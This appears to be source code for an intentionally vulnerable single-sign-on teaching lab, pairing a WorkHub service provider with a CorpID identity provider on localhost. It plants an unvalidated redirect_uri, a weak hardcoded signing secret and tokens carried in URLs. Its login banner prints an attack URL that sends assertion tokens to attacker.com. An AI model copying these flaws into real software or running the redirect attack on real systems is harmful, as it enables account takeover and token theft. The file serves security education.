/*
 * Terminal 1: cd auth-concepts/sso && npm install && npm run vulnerable
 * WorkHub (SP) + CorpID (IdP) — unvalidated redirect_uri (port 3064)
 */

const express = require('express');
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const app = express();
const PORT = 3064;

app.use(express.urlencoded({ extended: true }));

// ─── SP (WorkHub) session store ─────────────────────────────────────────────
const sessions = new Map();

// ─── IdP (CorpID) session store — survives SP logout ────────────────────────
const idpSessions = new Map();

// ⚠️ VULNERABILITY: weak IdP signing secret — predictable in a real deployment
const IDP_SECRET = 'idp-secret';

// ⚠️ VULNERABILITY: no redirect_uri allowlist — any URL is accepted
const REGISTERED_SPS = {
  workhub: { name: 'WorkHub', clientId: 'workhub-client-id' },
};

const IDP_USERS = [
  { id: 1, username: 'alice@corp.com', password: 'pass1234', name: 'Alice Chen', role: 'employee' },
  { id: 2, username: 'bob@corp.com', password: 'qwerty123', name: 'Bob Martinez', role: 'employee' },
  { id: 3, username: 'admin@corp.com', password: 'admin456', name: 'Admin User', role: 'admin' },
];

function escHtml(str) {
  return String(str || '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function getCookie(req, name) {
  const raw = req.headers.cookie || '';
  const match = raw.match(new RegExp('(?:^|;\\s*)' + name + '=([^;]+)'));
  return match ? match[1] : null;
}

function getWhSession(req) {
  const sid = getCookie(req, 'wh_session');
  return sid ? sessions.get(sid) : null;
}

function getIdpUser(req) {
  const sid = getCookie(req, 'corpid_session');
  if (!sid) return null;
  const userId = idpSessions.get(sid);
  if (!userId) return null;
  return IDP_USERS.find(function (u) { return u.id === userId; }) || null;
}

function issueAssertion(user) {
  return jwt.sign(
    { sub: user.id, email: user.username, name: user.name, role: user.role, type: 'sso_assertion' },
    IDP_SECRET,
    { expiresIn: '2m', algorithm: 'HS256' }
  );
}

function redirectWithAssertion(res, user, redirectUri, state) {
  const assertionToken = issueAssertion(user);
  // ⚠️ VULNERABILITY: redirect to whatever redirect_uri was provided — no allowlist check
  // NOTE: passing the token in the URL is also a known weakness — it appears in server logs,
  // browser history, and Referer headers. Production OAuth2 uses a short-lived code exchanged
  // server-to-server (authorization code flow) to avoid this. Simplified here for demo clarity.
  const redirectUrl = redirectUri + '?token=' + assertionToken + '&state=' + encodeURIComponent(state || '');
  console.log('[IdP] Redirecting to: ' + redirectUrl);
  res.redirect(redirectUrl);
}

function IDP_LOGIN_HTML(opts) {
  const clientName = opts.clientName || 'Unknown App';
  const redirectUri = opts.redirectUri || '';
  const state = opts.state || '';
  const clientId = opts.clientId || 'workhub-client-id';
  const error = opts.error || '';
  const loggedOut = opts.loggedOut;
  const warning = opts.warning;

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign In — CorpID</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #1e1e2e;
      color: #cdd6f4;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem 1rem;
    }
    .card {
      background: #181825;
      border: 1px solid #313244;
      border-radius: 12px;
      padding: 2.5rem;
      width: 100%;
      max-width: 420px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.35);
    }
    .logo { font-size: 1.75rem; font-weight: 700; color: #89b4fa; margin-bottom: 0.25rem; }
    .tagline { font-size: 0.85rem; color: #a6adc8; margin-bottom: 0.5rem; }
    .client-line { font-size: 0.9rem; color: #bac2de; margin-bottom: 1.5rem; }
    .client-line strong { color: #89b4fa; }
    .vuln-banner {
      background: #422006;
      border: 1px solid #f59e0b;
      color: #fcd34d;
      padding: 0.75rem;
      border-radius: 6px;
      font-size: 0.78rem;
      line-height: 1.5;
      margin-bottom: 1.25rem;
    }
    .info-banner {
      background: #0c1a2e;
      border: 1px solid #1e40af;
      color: #93c5fd;
      padding: 0.75rem;
      border-radius: 6px;
      font-size: 0.78rem;
      line-height: 1.5;
      margin-bottom: 1.25rem;
    }
    .redirect-uri {
      background: #11111b;
      border: 1px solid #f59e0b;
      color: #fbbf24;
      padding: 0.5rem 0.75rem;
      border-radius: 4px;
      font-size: 0.72rem;
      word-break: break-all;
      margin-bottom: 1.25rem;
      font-family: 'Courier New', Courier, monospace;
    }
    label { display: block; font-size: 0.8rem; color: #a6adc8; margin-bottom: 0.35rem; }
    .field-group { margin-bottom: 1rem; }
    .login-input {
      width: 100%; padding: 0.65rem 0.75rem; border: 1px solid #45475a;
      border-radius: 6px; font-size: 0.95rem; color: #cdd6f4;
      background: #11111b; outline: none; font-family: inherit;
    }
    .login-input:focus { border-color: #89b4fa; box-shadow: 0 0 0 3px rgba(137,180,250,0.2); }
    .btn-signin {
      width: 100%; background: #89b4fa; color: #1e1e2e; border: none;
      padding: 0.75rem; border-radius: 6px; font-size: 0.95rem;
      font-weight: 600; cursor: pointer; margin-top: 0.5rem;
    }
    .btn-signin:hover { background: #b4befe; }
    .err { color: #f38ba8; font-size: 0.85rem; margin-bottom: 1rem; min-height: 1.2rem; }
    .footer { margin-top: 1.5rem; font-size: 0.72rem; color: #6c7086; text-align: center; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">CorpID</div>
    <div class="tagline">One identity, everywhere</div>
    <div class="client-line">Authenticating for: <strong>${escHtml(clientName)}</strong></div>
    ${warning ? '<div class="vuln-banner">⚠ VULNERABLE: redirect_uri is not validated.<br>Attack: /idp/login?client_id=workhub-client-id&amp;redirect_uri=http://attacker.com/steal&amp;state=x<br>→ Victim logs in → assertion token sent to attacker.com instead of WorkHub</div>' : ''}
    ${loggedOut ? '<div class="info-banner">ℹ You signed out of WorkHub. Your CorpID session may still be active — clicking sign-in again will log you in immediately without a password.</div>' : ''}
    <div class="redirect-uri">redirect_uri: ${escHtml(redirectUri)}</div>
    <div class="err">${escHtml(error)}</div>
    <form method="POST" action="/idp/authenticate">
      <input type="hidden" name="redirect_uri" value="${escHtml(redirectUri)}">
      <input type="hidden" name="state" value="${escHtml(state)}">
      <input type="hidden" name="client_id" value="${escHtml(clientId)}">
      <div class="field-group">
        <label for="username">Work email</label>
        <input class="login-input" id="username" name="username" type="email" placeholder="you@corp.com" required>
      </div>
      <div class="field-group">
        <label for="password">Password</label>
        <input class="login-input" id="password" name="password" type="password" placeholder="••••••••" required>
      </div>
      <button class="btn-signin" type="submit">Sign in with CorpID</button>
    </form>
    <div class="footer">CorpID Identity Provider · port 3064/idp</div>
  </div>
</body>
</html>`;
}

function DASHBOARD_HTML(session) {
  const projects = [
    { name: 'Q2 Platform Migration', status: 'On track', members: 8 },
    { name: 'Customer Portal Redesign', status: 'At risk', members: 5 },
    { name: 'API Gateway v3', status: 'Planning', members: 3 },
  ];

  const projectRows = projects.map(function (p) {
    return '<tr><td>' + p.name + '</td><td>' + p.status + '</td><td>' + p.members + '</td></tr>';
  }).join('');

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Dashboard — WorkHub</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #ffffff;
      color: #111827;
      min-height: 100vh;
      display: flex;
    }
    .sidebar {
      width: 220px;
      background: #f9fafb;
      border-right: 1px solid #e5e7eb;
      padding: 1.5rem 1rem;
      flex-shrink: 0;
    }
    .logo { font-size: 1.25rem; font-weight: 700; color: #6366f1; margin-bottom: 0.25rem; }
    .logo-sub { font-size: 0.72rem; color: #6b7280; margin-bottom: 2rem; }
    .nav-item {
      padding: 0.5rem 0.75rem; border-radius: 6px; font-size: 0.88rem;
      color: #374151; margin-bottom: 0.25rem;
    }
    .nav-item.active { background: #eef2ff; color: #6366f1; font-weight: 600; }
    .main { flex: 1; display: flex; flex-direction: column; }
    .topbar {
      display: flex; align-items: center; justify-content: space-between;
      padding: 1rem 2rem; border-bottom: 1px solid #e5e7eb;
    }
    .topbar h1 { font-size: 1.1rem; font-weight: 600; }
    .user-area { display: flex; align-items: center; gap: 1rem; }
    .sso-badge {
      background: #eef2ff; color: #4f46e5; font-size: 0.72rem;
      padding: 0.25rem 0.6rem; border-radius: 999px; font-weight: 600;
    }
    .user-badge { text-align: right; }
    .user-name { font-size: 0.88rem; font-weight: 600; color: #111827; }
    .user-email { font-size: 0.75rem; color: #6b7280; }
    .btn-logout {
      background: #fff; border: 1px solid #d1d5db; color: #374151;
      padding: 0.4rem 0.85rem; border-radius: 6px; font-size: 0.8rem;
      text-decoration: none; font-weight: 500;
    }
    .btn-logout:hover { background: #f9fafb; }
    .content { padding: 2rem; }
    .content h2 { font-size: 1rem; margin-bottom: 1rem; color: #374151; }
    table { width: 100%; border-collapse: collapse; font-size: 0.88rem; }
    th { text-align: left; padding: 0.6rem 0.75rem; border-bottom: 2px solid #e5e7eb; color: #6b7280; font-weight: 600; }
    td { padding: 0.75rem; border-bottom: 1px solid #f3f4f6; }
    .role-pill {
      display: inline-block; background: #f3f4f6; color: #4b5563;
      font-size: 0.75rem; padding: 0.2rem 0.5rem; border-radius: 4px; margin-top: 0.5rem;
    }
  </style>
</head>
<body>
  <aside class="sidebar">
    <div class="logo">WorkHub</div>
    <div class="logo-sub">Your team's command center</div>
    <div class="nav-item active">Projects</div>
    <div class="nav-item">Tasks</div>
    <div class="nav-item">Team</div>
    <div class="nav-item">Reports</div>
  </aside>
  <div class="main">
    <header class="topbar">
      <h1>Project Dashboard</h1>
      <div class="user-area">
        <span class="sso-badge">Signed in via CorpID SSO</span>
        <div class="user-badge">
          <div class="user-name">${session.name}</div>
          <div class="user-email">${session.email}</div>
          <span class="role-pill">${session.role}</span>
        </div>
        <a class="btn-logout" href="/logout">Sign Out</a>
      </div>
    </header>
    <div class="content">
      <h2>Active Projects</h2>
      <table>
        <thead><tr><th>Project</th><th>Status</th><th>Members</th></tr></thead>
        <tbody>${projectRows}</tbody>
      </table>
    </div>
  </div>
</body>
</html>`;
}

// ═══════════════════════════════════════════════════════════════════════════════
// IdP routes — CorpID Identity Provider
// ═══════════════════════════════════════════════════════════════════════════════

// GET /idp/login?client_id=...&redirect_uri=...&state=...
app.get('/idp/login', function (req, res) {
  const clientId = req.query.client_id;
  const redirectUri = req.query.redirect_uri;
  const state = req.query.state || '';
  const sp = Object.values(REGISTERED_SPS).find(function (s) { return s.clientId === clientId; });

  // IdP SSO: if user already has CorpID session, skip login form
  const idpUser = getIdpUser(req);
  if (idpUser && redirectUri) {
    console.log('[IdP] Existing CorpID session for ' + idpUser.username + ' — SSO, no password prompt');
    return redirectWithAssertion(res, idpUser, redirectUri, state);
  }

  res.send(IDP_LOGIN_HTML({
    clientName: sp ? sp.name : clientId,
    redirectUri: redirectUri, // ⚠️ VULNERABILITY: passed through without validation
    state: state,
    clientId: clientId,
    error: req.query.error ? decodeURIComponent(String(req.query.error).replace(/\+/g, ' ')) : '',
    loggedOut: req.query.logged_out === '1',
    warning: '⚠ redirect_uri is NOT validated — attacker can set it to any server',
  }));
});

// POST /idp/authenticate
app.post('/idp/authenticate', function (req, res) {
  const username = req.body.username;
  const password = req.body.password;
  const redirectUri = req.body.redirect_uri;
  const state = req.body.state || '';

  const user = IDP_USERS.find(function (u) {
    return u.username === username && u.password === password;
  });

  if (!user) {
    return res.redirect(
      '/idp/login?error=Invalid+credentials&client_id=' + encodeURIComponent(req.body.client_id || 'workhub-client-id') +
      '&redirect_uri=' + encodeURIComponent(redirectUri) + '&state=' + encodeURIComponent(state)
    );
  }

  // Create IdP session — survives SP logout
  const idpSid = crypto.randomBytes(32).toString('hex');
  idpSessions.set(idpSid, user.id);
  res.setHeader('Set-Cookie', 'corpid_session=' + idpSid + '; Path=/idp; SameSite=Lax; HttpOnly');

  redirectWithAssertion(res, user, redirectUri, state);
});

// ═══════════════════════════════════════════════════════════════════════════════
// SP routes — WorkHub Service Provider
// ═══════════════════════════════════════════════════════════════════════════════

// GET / → redirect to IdP if not logged in
app.get('/', function (req, res) {
  if (getWhSession(req)) return res.redirect('/dashboard');

  const state = crypto.randomBytes(16).toString('hex');
  const loggedOut = req.query.logged_out === '1' ? '&logged_out=1' : '';
  // ⚠️ VULNERABILITY: redirect_uri is our callback — but IdP won't verify it matches
  const loginUrl = '/idp/login?client_id=workhub-client-id&redirect_uri=' +
    encodeURIComponent('http://localhost:3064/callback') + '&state=' + state + loggedOut;
  res.redirect(loginUrl);
});

// GET /callback?token=...&state=...
app.get('/callback', function (req, res) {
  const token = req.query.token;
  const state = req.query.state;

  try {
    const payload = jwt.verify(token, IDP_SECRET, { algorithms: ['HS256'] });
    if (payload.type !== 'sso_assertion') return res.status(400).send('Invalid token type');

    const sid = crypto.randomBytes(32).toString('hex');
    sessions.set(sid, { email: payload.email, name: payload.name, role: payload.role });
    res.setHeader('Set-Cookie', 'wh_session=' + sid + '; Path=/; SameSite=Lax; HttpOnly');
    res.redirect('/dashboard');
  } catch (err) {
    res.status(401).send('SSO callback failed: ' + err.message);
  }
});

// GET /dashboard — SSR with session data embedded
app.get('/dashboard', function (req, res) {
  const session = getWhSession(req);
  if (!session) return res.redirect('/');
  res.send(DASHBOARD_HTML(session));
});

// GET /logout — SP logout only; IdP session remains active
app.get('/logout', function (req, res) {
  const sid = getCookie(req, 'wh_session');
  if (sid) sessions.delete(sid);
  res.setHeader('Set-Cookie', 'wh_session=; Path=/; Max-Age=0');
  res.redirect('/?logged_out=1');
});

app.listen(PORT, function () {
  console.log('WorkHub + CorpID (vulnerable redirect_uri) running at http://localhost:' + PORT);
});
